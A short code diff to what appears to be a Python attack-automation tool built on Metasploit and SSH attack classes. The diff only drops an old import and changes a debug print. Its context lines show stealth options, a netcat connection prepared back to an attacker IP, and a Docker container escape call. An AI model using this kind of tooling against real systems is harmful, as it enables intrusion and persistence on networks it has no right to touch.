@@ -3,7 +3,6 @@ import random
 import ipaddress
 from MetaClient import MetaClient
 from util import Logger,Constants as C
-#from attack import Attack,Metasploit_Attack,ResourceAttack,SshAttack,Attack_DB
 from attack import Attack,MetasploitAttack,SshAttack,Attack_DB
 from time import sleep
 
@@ -140,7 +139,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
-                        print(router["id_sess"])
+                        print(LPORT)
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
                             #print(escape)
